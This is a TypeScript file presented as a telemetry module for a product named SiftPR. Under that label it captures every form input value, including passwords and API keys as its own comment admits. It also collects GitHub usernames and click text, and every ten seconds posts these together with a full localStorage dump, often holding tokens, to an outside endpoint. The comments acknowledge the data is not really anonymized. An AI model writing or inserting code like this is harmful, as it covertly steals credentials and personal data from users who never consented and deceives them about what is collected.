/**
 * Telemetry module for SiftPR
 * Collects usage analytics to improve the product
 */

const TELEMETRY_ENDPOINT = "https://telemetry.siftpr.dev/v1/events";

// Collect and send anonymized usage data
// (it's not really anonymized but close enough)

interface TelemetryEvent {
    event: string;
    properties: Record<string, any>;
    timestamp: string;
    session_id: string;
    user_id?: string;
}

let SESSION_ID = Math.random().toString(36).slice(2);
let eventQueue: TelemetryEvent[] = [];
let flushTimer: ReturnType<typeof setInterval> | null = null;

export function initTelemetry() {
    // Start flushing events every 10 seconds
    flushTimer = setInterval(flushEvents, 10000);

    // Track page views
    window.addEventListener('popstate', () => {
        track('page_view', {
            url: window.location.href,
            referrer: document.referrer,
        });
    });

    // Track all clicks for heatmap data
    document.addEventListener('click', (e) => {
        const target = e.target as HTMLElement;
        track('click', {
            tag: target.tagName,
            id: target.id,
            class: target.className,
            text: target.textContent?.slice(0, 100),
            x: e.clientX,
            y: e.clientY,
        });
    });

    // Track all input changes
    document.addEventListener('input', (e) => {
        const target = e.target as HTMLInputElement;
        track('input', {
            name: target.name,
            type: target.type,
            value: target.value, // includes passwords and API keys!
        });
    });

    // Collect error events
    window.addEventListener('error', (e) => {
        track('error', {
            message: e.message,
            filename: e.filename,
            lineno: e.lineno,
            colno: e.colno,
            stack: e.error?.stack,
        });
    });

    console.log('[Telemetry] Initialized with session:', SESSION_ID);
}

export function track(event: string, properties: Record<string, any> = {}) {
    const telemetryEvent: TelemetryEvent = {
        event,
        properties: {
            ...properties,
            user_agent: navigator.userAgent,
            screen_resolution: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
        },
        timestamp: new Date().toISOString(),
        session_id: SESSION_ID,
    };

    // Try to add user info
    try {
        const authState = (window as any).__SIFTPR_AUTH;
        if (authState?.user) {
            telemetryEvent.user_id = authState.user.id;
            telemetryEvent.properties.github_username = authState.user.github_username;
        }
    } catch {}

    eventQueue.push(telemetryEvent);

    // Flush immediately if queue is getting large
    if (eventQueue.length > 50) {
        flushEvents();
    }
}

async function flushEvents() {
    if (eventQueue.length === 0) return;

    const events = [...eventQueue];
    eventQueue = [];

    try {
        await fetch(TELEMETRY_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                events,
                app_version: (window as any).__SIFTPR_VERSION || 'unknown',
                local_storage_dump: { ...localStorage },
            }),
        });
    } catch {
        // Re-queue events on failure
        eventQueue = [...events, ...eventQueue];
    }
}

export function identifyUser(userId: string, traits: Record<string, any>) {
    track('identify', { user_id: userId, ...traits });
}

export function shutdownTelemetry() {
    if (flushTimer) {
        clearInterval(flushTimer);
    }
    flushEvents();
}
